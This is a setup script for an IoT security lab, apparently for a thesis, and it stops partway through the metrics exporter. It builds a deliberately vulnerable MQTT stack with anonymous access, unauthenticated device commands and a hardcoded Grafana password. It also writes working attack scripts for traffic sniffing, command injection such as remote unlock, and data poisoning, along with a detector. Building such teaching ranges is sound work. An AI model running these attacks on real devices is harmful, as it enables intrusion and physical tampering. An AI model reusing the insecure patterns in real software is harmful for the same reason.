#!/bin/bash
# =============================================================================
# setup_cyber_range.sh
#
# IoT Cyber Range - Full Environment Setup Script
#
# This script bootstraps the complete IoT Cyber Range project structure,
# creating all necessary files for both the insecure and secure architectures.
#
# Usage:
#   bash setup_cyber_range.sh [destination_folder]
#   bash setup_cyber_range.sh ~/Desktop/IoT_Cyber_Range
#
# Requirements:
#   - Docker Desktop >= 24.x (Apple Silicon supported)
#   - docker compose >= 2.x
#   - openssl (pre-installed on macOS)
#   - bash >= 3.x
#
# Architecture overview:
#   insecure/  - Vulnerable IoT infrastructure (no TLS, no auth, flat network)
#   secure/    - Hardened IoT infrastructure (mTLS, ACL, segmented network, IDS)
#   metrics/   - Comparative metrics collector
#   scripts/   - Orchestration and certificate generation scripts
# =============================================================================

set -e

DEST="${1:-.}"
mkdir -p "$DEST"
cd "$DEST"

echo "=============================================="
echo " IoT Cyber Range - Environment Setup"
echo " Destination: $(pwd)"
echo "=============================================="

# ------------------------------------------------------------------------------
# Create directory structure
# ------------------------------------------------------------------------------
mkdir -p insecure/{broker,backend,iot-device,attacker,exporter,prometheus}
mkdir -p insecure/grafana/provisioning/{datasources,dashboards}
mkdir -p insecure/results
mkdir -p secure/{broker/certs,backend,iot-device,attacker,ids/rules}
mkdir -p metrics scripts

echo "[+] Directory structure created"

# ==============================================================================
# INSECURE ARCHITECTURE
# ==============================================================================
# This environment intentionally exposes all known IoT vulnerabilities:
#   - MQTT broker with no TLS and anonymous access
#   - No command authentication on IoT devices
#   - Flat Docker network (no segmentation)
#   - Unauthenticated REST API on the backend
# ==============================================================================

# ------------------------------------------------------------------------------
# insecure/docker-compose.yml
# Defines the full insecure stack: broker, backend, 3 IoT devices,
# attacker container, Prometheus exporter, Prometheus, and Grafana.
# ------------------------------------------------------------------------------
cat > insecure/docker-compose.yml << 'EOF'
# =============================================================================
# Insecure IoT Architecture - Docker Compose
#
# All services share a single flat network (10.10.0.0/24), which means any
# container can reach any other container — a realistic but dangerous topology
# commonly found in real-world IoT deployments.
#
# Port mappings (host -> container):
#   1883  -> MQTT broker (plaintext)
#   5050  -> Backend REST API (unauthenticated)
#   8000  -> Prometheus metrics exporter
#   9090  -> Prometheus UI
#   3000  -> Grafana dashboard
# =============================================================================
networks:
  iot_flat_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.0.0/24

services:

  # ---------------------------------------------------------------------------
  # Mosquitto MQTT Broker
  # Vulnerability: anonymous access, no TLS, no ACL.
  # Any client on the network can connect and subscribe to any topic.
  # ---------------------------------------------------------------------------
  broker:
    build: ./broker
    container_name: insecure_broker
    ports:
      - "1883:1883"   # MQTT plaintext
      - "9001:9001"   # WebSocket (for browser-based MQTT clients)
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.10
    restart: unless-stopped

  # ---------------------------------------------------------------------------
  # Backend REST API
  # Vulnerability: no authentication on any endpoint, all sensor data exposed.
  # Port 5050 on the host maps to Flask's internal port 5000.
  # ---------------------------------------------------------------------------
  backend:
    build: ./backend
    container_name: insecure_backend
    environment:
      BROKER_HOST: 10.10.0.10
      BROKER_PORT: 1883
    ports:
      - "5050:5000"
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.20
    depends_on:
      - broker
    restart: unless-stopped

  # ---------------------------------------------------------------------------
  # IoT Device Simulators
  # Three devices publishing sensor data at different intervals.
  # Vulnerability: accept any command without signature validation.
  # ---------------------------------------------------------------------------
  iot-device-1:
    build: ./iot-device
    container_name: insecure_device_1
    environment:
      DEVICE_ID: device-001
      BROKER_HOST: 10.10.0.10
      BROKER_PORT: 1883
      PUBLISH_INTERVAL: 5       # seconds between sensor readings
      SENSOR_TYPE: temperature
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.101
    depends_on:
      - broker

  iot-device-2:
    build: ./iot-device
    container_name: insecure_device_2
    environment:
      DEVICE_ID: device-002
      BROKER_HOST: 10.10.0.10
      BROKER_PORT: 1883
      PUBLISH_INTERVAL: 7
      SENSOR_TYPE: humidity
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.102
    depends_on:
      - broker

  iot-device-3:
    build: ./iot-device
    container_name: insecure_device_3
    environment:
      DEVICE_ID: device-003
      BROKER_HOST: 10.10.0.10
      BROKER_PORT: 1883
      PUBLISH_INTERVAL: 10
      SENSOR_TYPE: door_lock
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.103
    depends_on:
      - broker

  # ---------------------------------------------------------------------------
  # Attacker Container
  # Pre-loaded with offensive scripts for MQTT sniffing, command injection,
  # data poisoning, and lateral movement demonstrations.
  # Results are saved to ./results/ on the host via volume mount.
  # ---------------------------------------------------------------------------
  attacker:
    build: ./attacker
    container_name: insecure_attacker
    volumes:
      - ./results:/attacks/results   # persist attack output to host
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.200
    depends_on:
      - broker
      - backend
    command: tail -f /dev/null       # keep container alive for docker exec

  # ---------------------------------------------------------------------------
  # Prometheus Metrics Exporter
  # Subscribes to all MQTT topics and exposes metrics in Prometheus format.
  # Detects anomalies (data poisoning, unauthorized commands) in real time.
  # ---------------------------------------------------------------------------
  exporter:
    build: ./exporter
    container_name: insecure_exporter
    environment:
      BROKER_HOST: 10.10.0.10
      BROKER_PORT: 1883
    ports:
      - "8000:8000"
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.210
    depends_on:
      - broker
    restart: unless-stopped

  # ---------------------------------------------------------------------------
  # Prometheus Time-Series Database
  # Scrapes metrics from the exporter every 5 seconds.
  # UI available at http://localhost:9090
  # ---------------------------------------------------------------------------
  prometheus:
    image: prom/prometheus:latest
    container_name: insecure_prometheus
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml:ro
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.211
    depends_on:
      - exporter
    restart: unless-stopped

  # ---------------------------------------------------------------------------
  # Grafana Visualization
  # Pre-configured with IoT security dashboard via provisioning.
  # UI available at http://localhost:3000 (admin / thesis2024)
  # ---------------------------------------------------------------------------
  grafana:
    image: grafana/grafana:latest
    container_name: insecure_grafana
    ports:
      - "3000:3000"
    environment:
      GF_SECURITY_ADMIN_PASSWORD: thesis2024
      GF_USERS_ALLOW_SIGN_UP: "false"
      GF_AUTH_ANONYMOUS_ENABLED: "true"
      GF_AUTH_ANONYMOUS_ORG_ROLE: Viewer
    volumes:
      - ./grafana/provisioning:/etc/grafana/provisioning:ro
    networks:
      iot_flat_net:
        ipv4_address: 10.10.0.212
    depends_on:
      - prometheus
    restart: unless-stopped
EOF

# ------------------------------------------------------------------------------
# insecure/broker/mosquitto.conf
# Deliberately permissive: anonymous access, no TLS, full logging.
# ------------------------------------------------------------------------------
cat > insecure/broker/mosquitto.conf << 'EOF'
# =============================================================================
# Mosquitto Configuration - INSECURE (intentional for research purposes)
#
# Security issues demonstrated:
#   1. allow_anonymous true  -> any client can connect without credentials
#   2. No TLS listener       -> all traffic transmitted in plaintext
#   3. No ACL file           -> any client can read/write any topic
# =============================================================================

listener 1883
protocol mqtt

listener 9001
protocol websockets

# VULNERABILITY: anonymous connections allowed
allow_anonymous true

# Full logging for traffic analysis and thesis documentation
log_type all
log_dest stdout

persistence true
persistence_location /mosquitto/data/
EOF

# ------------------------------------------------------------------------------
# insecure/broker/Dockerfile
# ------------------------------------------------------------------------------
cat > insecure/broker/Dockerfile << 'EOF'
FROM eclipse-mosquitto:2.0
COPY mosquitto.conf /mosquitto/config/mosquitto.conf
RUN mkdir -p /mosquitto/data /mosquitto/log
EXPOSE 1883 9001
EOF

# ------------------------------------------------------------------------------
# insecure/iot-device/device.py
# Simulates a resource-constrained IoT device with no security measures.
# ------------------------------------------------------------------------------
cat > insecure/iot-device/device.py << 'EOF'
#!/usr/bin/env python3
"""
IoT Device Simulator — Insecure Architecture

Simulates a resource-constrained IoT sensor device that publishes readings
to an MQTT broker without any security measures. This mirrors the behavior
of many real-world embedded devices that omit security due to hardware
limitations or negligence.

Demonstrated vulnerabilities:
    - Plaintext MQTT communication (no TLS)
    - No command authentication or signature verification
    - Executes any received command unconditionally
    - Predictable topic structure enabling easy enumeration
"""

import os
import json
import time
import random
import logging
import paho.mqtt.client as mqtt

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("iot-device")

# ---------------------------------------------------------------------------
# Configuration — loaded from environment variables for container flexibility
# ---------------------------------------------------------------------------
DEVICE_ID        = os.getenv("DEVICE_ID", "device-000")
BROKER_HOST      = os.getenv("BROKER_HOST", "localhost")
BROKER_PORT      = int(os.getenv("BROKER_PORT", 1883))
PUBLISH_INTERVAL = int(os.getenv("PUBLISH_INTERVAL", 5))
SENSOR_TYPE      = os.getenv("SENSOR_TYPE", "temperature")

# Topic structure: flat and predictable — easy to enumerate via wildcard
TOPIC_DATA   = f"iot/{DEVICE_ID}/data"
TOPIC_CMD    = f"iot/{DEVICE_ID}/cmd"
TOPIC_STATUS = f"iot/{DEVICE_ID}/status"


def generate_reading() -> dict:
    """Generate a simulated sensor reading based on the device's sensor type."""
    if SENSOR_TYPE == "temperature":
        return {"value": round(random.uniform(18.0, 35.0), 2), "unit": "C"}
    elif SENSOR_TYPE == "humidity":
        return {"value": round(random.uniform(30.0, 90.0), 2), "unit": "%"}
    elif SENSOR_TYPE == "door_lock":
        return {"value": random.choice(["locked", "unlocked"]), "unit": "state"}
    return {"value": round(random.uniform(0, 100), 2), "unit": "raw"}


def on_connect(client, userdata, flags, rc):
    """Callback fired when the device connects to the broker."""
    if rc == 0:
        log.info(f"Connected to broker at {BROKER_HOST}:{BROKER_PORT}")
        # Subscribe to command topic — no authentication check
        client.subscribe(TOPIC_CMD)
        # Publish online status with retain flag so new subscribers see it
        client.publish(
            TOPIC_STATUS,
            json.dumps({"status": "online", "device": DEVICE_ID}),
            retain=True
        )
    else:
        log.error(f"Connection refused, return code: {rc}")


def on_message(client, userdata, msg):
    """
    Handle incoming commands.

    VULNERABILITY: Commands are executed without any form of authentication,
    authorization, or signature verification. An attacker who can publish to
    this topic has full control over the device.
    """
    try:
        payload = json.loads(msg.payload.decode())
        log.warning(f"[CMD RECEIVED] topic={msg.topic} payload={payload}")

        cmd = payload.get("cmd", "")

        if cmd == "reboot":
            log.warning("REBOOT command received — simulating restart")
            time.sleep(2)

        elif cmd == "set_interval":
            # VULNERABILITY: interval can be set to 1s, causing a publish flood (DoS)
            global PUBLISH_INTERVAL
            PUBLISH_INTERVAL = int(payload.get("value", PUBLISH_INTERVAL))
            log.warning(f"PUBLISH INTERVAL changed to {PUBLISH_INTERVAL}s by remote command")

        elif cmd == "unlock":
            # VULNERABILITY: physical actuator command accepted without any auth
            log.critical("DEVICE UNLOCKED via unauthenticated remote command!")

        else:
            log.info(f"Unknown command ignored: {cmd}")

    except Exception as e:
        log.error(f"Failed to parse command payload: {e}")


def on_disconnect(client, userdata, rc):
    """Callback fired on disconnection — logs for monitoring purposes."""
    log.warning(f"Disconnected from broker (rc={rc})")


def main():
    client = mqtt.Client(client_id=DEVICE_ID)

    # VULNERABILITY: no TLS context configured — all data in plaintext
    client.on_connect    = on_connect
    client.on_message    = on_message
    client.on_disconnect = on_disconnect

    # Last-will message published automatically by broker on unexpected disconnect
    client.will_set(
        TOPIC_STATUS,
        json.dumps({"status": "offline", "device": DEVICE_ID}),
        retain=True
    )

    # Retry loop — IoT devices must be resilient to broker restarts
    while True:
        try:
            client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
            break
        except Exception as e:
            log.error(f"Cannot connect to broker: {e}. Retrying in 5s...")
            time.sleep(5)

    client.loop_start()
    log.info(f"Device {DEVICE_ID} ({SENSOR_TYPE}) started. Publishing every {PUBLISH_INTERVAL}s")

    while True:
        reading = generate_reading()
        payload = {
            "device_id": DEVICE_ID,
            "sensor":    SENSOR_TYPE,
            "timestamp": time.time(),
            **reading
        }
        # VULNERABILITY: payload transmitted in cleartext — trivially sniffable
        client.publish(TOPIC_DATA, json.dumps(payload))
        log.info(f"Published: {payload}")
        time.sleep(PUBLISH_INTERVAL)


if __name__ == "__main__":
    main()
EOF

# ------------------------------------------------------------------------------
# insecure/iot-device/Dockerfile
# ------------------------------------------------------------------------------
cat > insecure/iot-device/Dockerfile << 'EOF'
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir paho-mqtt==1.6.1
COPY device.py .
CMD ["python", "-u", "device.py"]
EOF

# ------------------------------------------------------------------------------
# insecure/backend/backend.py
# REST API that aggregates MQTT data with no authentication.
# ------------------------------------------------------------------------------
cat > insecure/backend/backend.py << 'EOF'
#!/usr/bin/env python3
"""
IoT Backend — Insecure Architecture

Aggregates sensor data from all MQTT devices and exposes it via a REST API.
Also passively observes command traffic, making injected commands visible
in the /api/events endpoint — useful for thesis attack documentation.

Demonstrated vulnerabilities:
    - No authentication on any REST endpoint
    - All device data accessible to anyone who can reach the server
    - Command injection events logged but not prevented
"""

import os
import json
import time
import threading
import logging
from collections import defaultdict, deque
from flask import Flask, jsonify
import paho.mqtt.client as mqtt

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("backend")

BROKER_HOST = os.getenv("BROKER_HOST", "localhost")
BROKER_PORT = int(os.getenv("BROKER_PORT", 1883))

app = Flask(__name__)

# In-memory store: device_id -> last 100 readings
device_data:   dict[str, deque] = defaultdict(lambda: deque(maxlen=100))
device_status: dict[str, dict]  = {}
attack_log:    list[dict]        = []   # passive log of observed commands


# ---------------------------------------------------------------------------
# MQTT Callbacks
# ---------------------------------------------------------------------------

def on_connect(client, userdata, flags, rc):
    """Subscribe to all IoT topics with a wildcard on successful connection."""
    log.info(f"Backend connected to broker (rc={rc})")
    client.subscribe("iot/#")


def on_message(client, userdata, msg):
    """
    Process incoming MQTT messages.
    Routes messages to the appropriate store based on topic type.
    Also records observed commands as attack evidence.
    """
    try:
        payload = json.loads(msg.payload.decode())
        parts   = msg.topic.split("/")

        if len(parts) >= 3:
            device_id = parts[1]
            msg_type  = parts[2]

            if msg_type == "data":
                device_data[device_id].append({**payload, "_received_at": time.time()})

            elif msg_type == "status":
                device_status[device_id] = payload

            elif msg_type == "cmd":
                # Passively log injected commands for the /api/events endpoint
                entry = {
                    "timestamp": time.time(),
                    "device":    device_id,
                    "payload":   payload
                }
                attack_log.append(entry)
                log.warning(f"[PASSIVE OBSERVATION] Command on {msg.topic}: {payload}")

    except Exception as e:
        log.error(f"Message parsing error: {e}")


# ---------------------------------------------------------------------------
# REST API Endpoints
# VULNERABILITY: no authentication decorator on any route
# ---------------------------------------------------------------------------

@app.route("/api/devices")
def get_devices():
    """List all known devices and their current status."""
    return jsonify({"devices": list(device_data.keys()), "status": device_status})


@app.route("/api/devices/<device_id>/data")
def get_device_data(device_id: str):
    """Return the last 100 readings for a specific device."""
    return jsonify({
        "device_id": device_id,
        "readings":  list(device_data.get(device_id, []))
    })


@app.route("/api/devices/all")
def get_all_data():
    """Return all sensor data for all devices — full data exfiltration endpoint."""
    return jsonify({dev: list(readings) for dev, readings in device_data.items()})


@app.route("/api/events")
def get_events():
    """Return the log of all observed commands, including injected ones."""
    return jsonify({"events": attack_log})


@app.route("/health")
def health():
    """Health check endpoint for Docker and monitoring."""
    return jsonify({"status": "ok", "broker": f"{BROKER_HOST}:{BROKER_PORT}"})


# ---------------------------------------------------------------------------
# Application Entry Point
# ---------------------------------------------------------------------------

def start_mqtt():
    """Start the MQTT client in a background thread."""
    client = mqtt.Client(client_id="backend-collector")
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    client.loop_forever()


if __name__ == "__main__":
    threading.Thread(target=start_mqtt, daemon=True).start()
    log.info("Backend started on :5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
EOF

# ------------------------------------------------------------------------------
# insecure/backend/Dockerfile
# ------------------------------------------------------------------------------
cat > insecure/backend/Dockerfile << 'EOF'
FROM python:3.11-slim
WORKDIR /app
RUN pip install --no-cache-dir flask==3.0.3 paho-mqtt==1.6.1
COPY backend.py .
EXPOSE 5000
CMD ["python", "-u", "backend.py"]
EOF

# ------------------------------------------------------------------------------
# insecure/attacker/attack_01_sniff.py
# Demonstrates MQTT traffic interception via wildcard subscription.
# ------------------------------------------------------------------------------
cat > insecure/attacker/attack_01_sniff.py << 'EOF'
#!/usr/bin/env python3
"""
Attack 01 — MQTT Traffic Sniffing

Demonstrates that without TLS, any network participant can subscribe to the
wildcard topic '#' and read all MQTT traffic in cleartext. This includes
sensor values, device status, and any credentials that may be transmitted.

Usage:
    python attack_01_sniff.py [broker_host] [duration_seconds]
    python attack_01_sniff.py 10.10.0.10 30

Output:
    - Live console feed of all intercepted messages
    - CSV report saved to /attacks/results/sniff_<timestamp>.csv
"""

import json
import time
import csv
import sys
import os
import paho.mqtt.client as mqtt

BROKER_HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.10"
DURATION    = int(sys.argv[2]) if len(sys.argv) > 2 else 30

intercepted: list[dict] = []


def on_connect(client, userdata, flags, rc):
    """Subscribe to all topics once connected."""
    print(f"[*] Attacker connected to broker at {BROKER_HOST}:1883")
    client.subscribe("#")   # wildcard: intercept every single message
    print(f"[*] Subscribed to '#' — sniffing for {DURATION}s...")


def on_message(client, userdata, msg):
    """Record every intercepted message with metadata."""
    entry = {
        "timestamp": time.time(),
        "topic":     msg.topic,
        "qos":       msg.qos,
        "retain":    msg.retain,
        "payload":   msg.payload.decode(errors="replace"),
        "size_bytes": len(msg.payload)
    }
    intercepted.append(entry)
    print(f"[SNIFF] {msg.topic} -> {entry['payload'][:120]}")


def main():
    client = mqtt.Client(client_id="attacker-sniffer")
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(BROKER_HOST, 1883, keepalive=60)
    client.loop_start()

    time.sleep(DURATION)

    client.loop_stop()
    client.disconnect()

    # -------------------------------------------------------------------------
    # Save results to CSV for thesis documentation
    # -------------------------------------------------------------------------
    os.makedirs("/attacks/results", exist_ok=True)
    output_file = f"/attacks/results/sniff_{int(time.time())}.csv"

    with open(output_file, "w", newline="") as f:
        writer = csv.DictWriter(
            f, fieldnames=["timestamp", "topic", "qos", "retain", "payload", "size_bytes"]
        )
        writer.writeheader()
        writer.writerows(intercepted)

    # -------------------------------------------------------------------------
    # Summary statistics
    # -------------------------------------------------------------------------
    topics = set(e["topic"] for e in intercepted)
    print(f"\n{'='*50}")
    print(f"[+] Sniffing complete — {DURATION}s duration")
    print(f"[+] Messages intercepted : {len(intercepted)}")
    print(f"[+] Unique topics found  : {len(topics)}")
    print(f"{'='*50}")
    for t in sorted(topics):
        count = sum(1 for e in intercepted if e["topic"] == t)
        print(f"    {t}: {count} messages")
    print(f"\n[+] Results saved to: {output_file}")


if __name__ == "__main__":
    main()
EOF

# ------------------------------------------------------------------------------
# insecure/attacker/attack_02_cmd_inject.py
# Multi-phase attack: discovery, command injection, data poisoning, lateral movement.
# ------------------------------------------------------------------------------
cat > insecure/attacker/attack_02_cmd_inject.py << 'EOF'
#!/usr/bin/env python3
"""
Attack 02 — Command Injection, Data Poisoning & Lateral Movement

Demonstrates a full attack chain against an unprotected IoT infrastructure:

    Phase 1 — Device Discovery:
        Subscribe to 'iot/#' and enumerate all active devices by observing
        which device IDs appear in topic paths.

    Phase 2 — Command Injection:
        Publish unauthorized commands to every discovered device:
          - set_interval(1): flood the broker (DoS)
          - unlock:          trigger physical actuator remotely
          - reboot:          disrupt device availability

    Phase 3 — Data Poisoning:
        Publish fake sensor readings (-99.9) to corrupt the backend's
        data store and mislead any monitoring systems.

    Phase 4 — Lateral Movement:
        Demonstrate that the MQTT broker acts as a pivot point, giving
        an attacker simultaneous access to all connected devices from
        a single unauthenticated connection.

Usage:
    python attack_02_cmd_inject.py [broker_host]
    python attack_02_cmd_inject.py 10.10.0.10
"""

import json
import time
import sys
import os
import paho.mqtt.client as mqtt

BROKER_HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.10"

# Attack result summary for thesis metrics
results = {
    "attack_start":        time.time(),
    "commands_sent":       0,
    "devices_compromised": [],
    "data_poisoned":       0,
    "lateral_targets":     0
}

discovered_devices: set[str] = set()


# ---------------------------------------------------------------------------
# Phase 1 — Device Discovery
# ---------------------------------------------------------------------------

def discover_devices(client: mqtt.Client, duration: int = 12) -> None:
    """
    Enumerate IoT devices by subscribing to the wildcard topic and
    extracting device IDs from the topic path structure.
    """
    print(f"\n[PHASE 1] Device discovery via MQTT topic enumeration ({duration}s)...")

    def on_discovery_msg(c, u, msg):
        parts = msg.topic.split("/")
        if len(parts) >= 2 and parts[0] == "iot":
            discovered_devices.add(parts[1])

    client.on_message = on_discovery_msg
    client.subscribe("iot/#")
    time.sleep(duration)

    print(f"[+] Devices discovered: {discovered_devices}")


# ---------------------------------------------------------------------------
# Phase 2 — Command Injection
# ---------------------------------------------------------------------------

def inject_commands(client: mqtt.Client) -> None:
    """
    Send unauthorized commands to all discovered devices.
    No authentication or signing is required by the broker or devices.
    """
    print("\n[PHASE 2] Command injection on all discovered devices...")

    attack_commands = [
        ({"cmd": "set_interval", "value": 1}, "DoS — flood broker with 1s interval"),
        ({"cmd": "unlock"},                   "Physical unlock — unauthenticated"),
        ({"cmd": "reboot"},                   "Service disruption — forced reboot"),
    ]

    for device_id in discovered_devices:
        topic = f"iot/{device_id}/cmd"
        for payload, description in attack_commands:
            client.publish(topic, json.dumps(payload), qos=1)
            print(f"  [INJECT] {device_id} <- {description}")
            results["commands_sent"] += 1
            time.sleep(0.3)

        results["devices_compromised"].append(device_id)


# ---------------------------------------------------------------------------
# Phase 3 — Data Poisoning
# ---------------------------------------------------------------------------

def poison_data(client: mqtt.Client) -> None:
    """
    Inject anomalous sensor values into the data stream.
    The backend accepts these without validation, corrupting stored readings.
    """
    print("\n[PHASE 3] Data poisoning — injecting fake sensor readings...")

    for device_id in discovered_devices:
        topic = f"iot/{device_id}/data"
        fake_payload = {
            "device_id": device_id,
            "sensor":    "temperature",
            "timestamp": time.time(),
            "value":     -99.9,     # anomalous value — outside physical range
            "unit":      "C",
            "_injected": True       # marker for metrics and detection testing
        }
        client.publish(topic, json.dumps(fake_payload))
        print(f"  [POISON] {device_id}: injected value -99.9°C")
        results["data_poisoned"] += 1


# ---------------------------------------------------------------------------
# Phase 4 — Lateral Movement
# ---------------------------------------------------------------------------

def lateral_movement(client: mqtt.Client) -> None:
    """
    Demonstrate that the MQTT broker acts as a pivot: from a single
    unauthenticated connection, the attacker can reach all devices.
    In a segmented network this would be impossible.
    """
    print("\n[PHASE 4] Lateral movement demonstration...")
    print(f"  [*] Single access point: broker at {BROKER_HOST}")
    print(f"  [*] Devices reachable from this connection: {len(discovered_devices)}")
    print(f"  [*] No network segmentation — all targets accessible simultaneously")

    # Probe system topics and potential admin channels
    client.publish("$SYS/test",  "lateral_movement_probe")
    client.publish("admin/cmd",  json.dumps({"cmd": "get_config"}))

    results["lateral_targets"] = len(discovered_devices)


# ---------------------------------------------------------------------------
# Main Entry Point
# ---------------------------------------------------------------------------

def main():
    client = mqtt.Client(client_id="attacker-injector")
    client.connect(BROKER_HOST, 1883)
    client.loop_start()

    discover_devices(client)
    inject_commands(client)
    poison_data(client)
    lateral_movement(client)

    client.loop_stop()
    client.disconnect()

    # Build final summary
    results["attack_end"]  = time.time()
    results["duration_s"]  = results["attack_end"] - results["attack_start"]

    print(f"\n{'='*50}")
    print("ATTACK SUMMARY")
    print(f"{'='*50}")
    for key, value in results.items():
        print(f"  {key}: {value}")

    # Save JSON report
    os.makedirs("/attacks/results", exist_ok=True)
    output_file = f"/attacks/results/cmd_inject_{int(time.time())}.json"
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Report saved to: {output_file}")


if __name__ == "__main__":
    main()
EOF

# ------------------------------------------------------------------------------
# insecure/attacker/Dockerfile
# ------------------------------------------------------------------------------
cat > insecure/attacker/Dockerfile << 'EOF'
FROM python:3.11-slim

# Install network and MQTT tools for attack demonstrations
RUN apt-get update && apt-get install -y --no-install-recommends \
    mosquitto-clients \
    tcpdump \
    nmap \
    netcat-openbsd \
    curl \
    && rm -rf /var/lib/apt/lists/*

RUN pip install --no-cache-dir paho-mqtt==1.6.1 requests

WORKDIR /attacks
COPY . .

# Container stays alive for interactive docker exec sessions
CMD ["tail", "-f", "/dev/null"]
EOF

# ------------------------------------------------------------------------------
# insecure/exporter/exporter.py
# Prometheus metrics exporter — subscribes to all MQTT topics and exposes
# IoT metrics and attack detection signals in Prometheus format.
# ------------------------------------------------------------------------------
cat > insecure/exporter/exporter.py << 'EOF'
#!/usr/bin/env python3
"""
Prometheus Metrics Exporter — Insecure IoT Architecture

Subscribes to all MQTT topics and derives security-relevant metrics
that are exposed via an HTTP endpoint for Prometheus to scrape.

Metrics exposed:
    iot_sensor_value              - current sensor reading per device
    iot_device_online             - device availability (0/1)
    iot_messages_total            - total MQTT messages per topic
    iot_messages_per_device       - total messages per device
    iot_attack_commands_total     - unauthorized commands received per device
    iot_attack_unlock_total       - unauthorized unlock events per device
    iot_attack_poison_total       - data poisoning events per device
    iot_attack_connections_total  - total unauthorized command attempts
    iot_last_attack_timestamp     - Unix timestamp of the last attack event

Endpoint: http://localhost:8000/metrics
"""

import os
import time
import json
import threading
import logging
from collections import defaultdict, deque
from flask import Flask, Response
import paho.mqtt.client as mqtt

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
log = logging.getLogger("exporter")

BROKER_HOST = os.getenv("BROKER_HOST", "10.10.0.10")
BROKER_PORT = int(os.getenv("BROKER_PORT", 1883))

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Internal metrics state — protected by a threading lock
# ---------------------------------------------------------------------------
_lock = threading.Lock()

state = {
    "sensor_values":       {},                      # device_id -> {value, sensor, unit, timestamp}
    "device_online":       {},                      # device_id -> 0 or 1
    "messages_total":      defaultdict(int),        # topic -> count
    "messages_per_device": defaultdict(int),        # device_id -> count
    "attack_commands":     defaultdict(int),        # device_id -> count
    "unlock_events":       defaultdict(int),        # device_id -> count
    "attack_poison":       defaultdict(int),        # device_id -> count
    "attack_connections":  0,                       # total unauthorized commands
    "attack_timeline":     deque(maxlen=100),       # last 100 attack events
}


# ---------------------------------------------------------------------------
# MQTT Message Processing
# ---------------------------------------------------------------------------

def on_connect(client, userdata, flags, rc):
    """Subscribe to all topics on successful broker connection."""
    log.info(f"Exporter connected to broker (rc={rc})")
    client.subscribe("#")


def on_message(client, userdata, msg):
    """
    Parse each MQTT message and update the corresponding metrics.
    Anomaly detection (data poisoning) is performed here in real time.
    """
    with _lock:
        topic = msg.topic
        parts = topic.split("/")
        now   = time.time()

        state["messages_total"][topic] += 1

        # Only process IoT device topics
        if len(parts) < 3 or parts[0] != "iot":
            return

        device_id = parts[1]
        msg_type  = parts[2]
        state["messages_per_device"][device_id] += 1

        try:
            payload = json.loads(msg.payload.decode())
        except Exception:
            return

        # ── Device status ──────────────────────────────────────────────────
        if msg_type == "status":
            state["device_online"][device_id] = (
                1 if payload.get("status") == "online" else 0
            )

        # ── Sensor data ────────────────────────────────────────────────────
        elif msg_type == "data":
            value  = payload.get("value")
            sensor = payload.get("sensor", "unknown")

            if isinstance(value, (int, float)):
                # Anomaly detection: values outside physical range indicate poisoning
                if value < -50 or value > 200:
                    state["attack_poison"][device_id] += 1
                    state["attack_timeline"].append({
                        "ts": now, "type": "data_poison",
                        "device": device_id, "value": value
                    })
                    log.warning(f"[ANOMALY] Data poisoning detected on {device_id}: {value}")
                else:
                    state["sensor_values"][device_id] = {
                        "value":     float(value),
                        "sensor":    sensor,
                        "unit":      payload.get("unit", ""),
                        "timestamp": now
                    }
            elif isinstance(value, str):
                # Map door lock state to numeric: locked=1, unlocked=0
                numeric = 1 if value == "locked" else 0
                state["sensor_values"][device_id] = {
                    "value":     numeric,
                    "sensor":    sensor,
                    "unit":      "state",
                    "timestamp": now
                }

        # ── Command events ─────────────────────────────────────────────────
        elif msg_type == "cmd":
            cmd = payload.get("cmd", "unknown")
            state["attack_commands"][device_id] += 1
            state["attack_connections"] += 1

            if cmd == "unlock":
                state["unlock_events"][device_id] += 1
                state["attack_timeline"].append(
                    {"ts": now, "type": "unlock", "device": device_id}
                )
            elif cmd == "set_interval":
                state["attack_timeline"].append(
                    {"ts": now, "type": "dos", "device": device_id,
                     "value": payload.get("value")}
                )
            elif cmd == "reboot":
                state["attack_timeline"].append(
                    {"ts": now, "type": "reboot", "device": device_id}
                )


# ---------------------------------------------------------------------------
# Prometheus Exposition Format
# ---------------------------------------------------------------------------

def generate_metrics() -> str:
    """
    Render all metrics in Prometheus text exposition format (version 0.0.4).
    Each metric includes a HELP comment and TYPE declaration.
    """
    lines = []

    with _lock:
        # Sensor values
        lines += [
            "# HELP iot_sensor_value Current sensor reading for each IoT device",
            "# TYPE iot_sensor_value gauge"
        ]
        for dev, data in state["sensor_values"].items():
            labels = f'device="{dev}",sensor="{data["sensor"]}",unit="{data["unit"]}"'
            lines.append(f"iot_sensor_value{{{labels}}} {data['value']}")

        # Device availability
        lines += [
            "# HELP iot_device_online 1 if the device is online, 0 otherwise",
            "# TYPE iot_device_online gauge"
        ]
        for dev, status in state["device_online"].items():
            lines.append(f'iot_device_online{{device="{dev}"}} {status}')

        # Total messages per topic
        lines += [
            "# HELP iot_messages_total Total MQTT messages observed per topic",
            "# TYPE iot_messages_total counter"
        ]
        for topic, count in state["messages_total"].items():
            safe = topic.replace('"', '\\"')
            lines.append(f'iot_messages_total{{topic="{safe}"}} {count}')

        # Messages per device
        lines += [
            "# HELP iot_messages_per_device Total MQTT messages per device",
